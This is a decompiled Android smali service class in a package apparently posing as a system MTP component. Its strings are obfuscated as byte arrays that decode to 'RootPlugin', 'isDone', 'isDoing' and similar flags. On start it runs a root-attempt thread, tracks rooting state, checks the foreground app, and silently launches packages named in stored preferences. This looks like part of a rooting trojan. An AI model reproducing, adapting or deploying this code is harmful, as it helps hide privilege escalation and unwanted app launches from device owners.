.class public Lcom/android/mtp/rp/MyService;
.super Landroid/app/Service;


# static fields
.field public static a:Ljava/lang/String;

.field public static newb:I

.field private static c:Ljava/lang/String;

.field private static d:Ljava/lang/String;

.field private static e:Ljava/lang/String;

.field private static f:Ljava/lang/String;


# instance fields
.field private g:La/a/b;


# direct methods
.method static constructor <clinit>()V
    .registers 2

    const/4 v1, 0x7

    const-string v0, ""

    sput-object v0, Lcom/android/mtp/rp/MyService;->a:Ljava/lang/String;

    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_46

    invoke-static {v0}, Lcom/android/mtp/rp/MyService;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/mtp/rp/MyService;->a:Ljava/lang/String;

    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_50

    invoke-static {v0}, Lcom/android/mtp/rp/MyService;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/mtp/rp/MyService;->c:Ljava/lang/String;

    new-array v0, v1, [B

    fill-array-data v0, :array_58

    invoke-static {v0}, Lcom/android/mtp/rp/MyService;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/mtp/rp/MyService;->d:Ljava/lang/String;

    const/16 v0, 0x8

    new-array v0, v0, [B

    fill-array-data v0, :array_60

    invoke-static {v0}, Lcom/android/mtp/rp/MyService;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/mtp/rp/MyService;->e:Ljava/lang/String;

    new-array v0, v1, [B

    fill-array-data v0, :array_68

    invoke-static {v0}, Lcom/android/mtp/rp/MyService;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/mtp/rp/MyService;->f:Ljava/lang/String;

    const/16 v0, 0x9

    sput v0, Lcom/android/mtp/rp/MyService;->newb:I

    return-void

    :array_46
    .array-data 1
        0x52t
        0x6ft
        0x6ft
        0x74t
        0x50t
        0x6ct
        0x75t
        0x67t
        0x69t
        0x6et
    .end array-data

    nop

    :array_50
    .array-data 1
        0x69t
        0x73t
        0x44t
        0x6ft
        0x6et
        0x65t
    .end array-data

    nop

    :array_58
    .array-data 1
        0x69t
        0x73t
        0x44t
        0x6ft
        0x69t
        0x6et
        0x67t
    .end array-data

    :array_60
    .array-data 1
        0x69t
        0x73t
        0x52t
        0x65t
        0x62t
        0x6ft
        0x6ft
        0x74t
    .end array-data

    :array_68
    .array-data 1
        0x69t
        0x73t
        0x53t
        0x74t
        0x61t
        0x72t
        0x74t
    .end array-data
.end method

.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private static a([B)Ljava/lang/String;
    .registers 2

    if-nez p0, :cond_5

    const-string v0, ""

    :goto_4
    return-object v0

    :cond_5
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, p0}, Ljava/lang/String;-><init>([B)V

    goto :goto_4
.end method

.method private a()V
    .registers 7

    const/4 v5, 0x0

    const-string v0, ""

    const-string v1, "### MyService begin"

    invoke-static {v0, v1}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    const-string v1, "RtLib"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, La/a/b;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v1

    sget-object v0, Lcom/android/mtp/rp/MyService;->c:Ljava/lang/String;

    invoke-virtual {v1, v0, v5}, La/a/b/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_21

    const-string v2, "done"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4b

    :cond_21
    sget-object v0, Lcom/android/mtp/rp/MyService;->d:Ljava/lang/String;

    invoke-virtual {v1, v0, v5}, La/a/b/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_39

    const-string v2, "doing"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_39

    const-string v0, ""

    const-string v1, "are doing"

    invoke-static {v0, v1}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_38
    return-void

    :cond_39
    sget-object v0, Lcom/android/mtp/rp/MyService;->d:Ljava/lang/String;

    const-string v2, "doing"

    invoke-virtual {v1, v0, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    new-instance v0, Lcom/android/mtp/rp/NewC;

    iget-object v1, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-direct {v0, v1}, Lcom/android/mtp/rp/NewC;-><init>(La/a/a;)V

    invoke-virtual {v0}, Lcom/android/mtp/rp/NewC;->start()V

    goto :goto_38

    :cond_4b
    const-string v0, ""

    const-string v2, "root already done"

    invoke-static {v0, v2}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/android/mtp/rp/MyService;->f:Ljava/lang/String;

    invoke-virtual {v1, v0, v5}, La/a/b/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_de

    const-string v0, ""

    const-string v2, "prepare run"

    invoke-static {v0, v2}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "packageName1"

    invoke-virtual {v1, v0, v5}, La/a/b/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_94

    const-string v2, ""

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "packageName:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_81
    iget-object v2, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v2}, La/a/b;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v2, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    iget-object v2, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v2}, La/a/b;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_94
    .catch Ljava/lang/Exception; {:try_start_81 .. :try_end_94} :catch_d0

    :cond_94
    :goto_94
    const-string v0, "packageName2"

    invoke-virtual {v1, v0, v5}, La/a/b/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_c7

    const-string v2, ""

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "packageName:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_b4
    iget-object v2, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v2}, La/a/b;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v2, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    iget-object v2, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v2}, La/a/b;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_c7
    .catch Ljava/lang/Exception; {:try_start_b4 .. :try_end_c7} :catch_d7

    :cond_c7
    :goto_c7
    sget-object v0, Lcom/android/mtp/rp/MyService;->f:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v1, v0, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    goto/16 :goto_38

    :catch_d0
    move-exception v0

    const-string v2, ""

    invoke-static {v2, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_94

    :catch_d7
    move-exception v0

    const-string v2, ""

    invoke-static {v2, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_c7

    :cond_de
    const-string v0, ""

    const-string v1, "already run or no need run"

    invoke-static {v0, v1}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_38
.end method

.method private a(Ljava/lang/String;)Z
    .registers 6

    const/4 v2, 0x1

    const/4 v1, 0x0

    invoke-static {p1}, La/a/e/f;->a(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    move v0, v1

    :goto_9
    return v0

    :cond_a
    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v0}, La/a/b;->c()Landroid/app/ActivityManager;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_18
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_20

    move v0, v1

    goto :goto_9

    :cond_20
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v0, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v0}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    move v0, v2

    goto :goto_9
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 3

    const-string v0, ""

    const-string v1, "==========================> ### MyService onCreate"

    invoke-static {v0, v1}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Lcom/android/mtp/rp/MyService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, La/a/a/a;->a(Landroid/content/Context;)V

    invoke-static {}, La/a/a/a;->b()V

    invoke-static {}, La/a/b;->f()La/a/b;

    move-result-object v0

    iput-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v0, p0}, La/a/b;->a(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    invoke-virtual {v0}, La/a/b;->d()V

    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    sget v1, Lcom/android/mtp/rp/MyService;->newb:I

    invoke-virtual {v0, v1}, La/a/b;->a(I)V

    return-void
.end method

.method public onDestroy()V
    .registers 3

    const-string v0, ""

    const-string v1, "==========================> ### MyService onDestroy"

    invoke-static {v0, v1}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    invoke-static {}, La/a/a/a;->c()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 6

    const-string v0, ""

    const-string v1, "==========================> ### MyService onStartCommand"

    invoke-static {v0, v1}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    if-eqz v0, :cond_12

    iget-object v0, p0, Lcom/android/mtp/rp/MyService;->g:La/a/b;

    sget v1, Lcom/android/mtp/rp/MyService;->newb:I

    invoke-virtual {v0, v1}, La/a/b;->a(I)V

    :cond_12
    invoke-static {}, La/a/a/a;->a()I

    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    invoke-virtual {p0}, Lcom/android/mtp/rp/MyService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/android/mtp/rp/MyService;->a(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_25

    invoke-direct {p0}, Lcom/android/mtp/rp/MyService;->a()V

    :cond_25
    const/4 v0, 0x2

    return v0
.end method
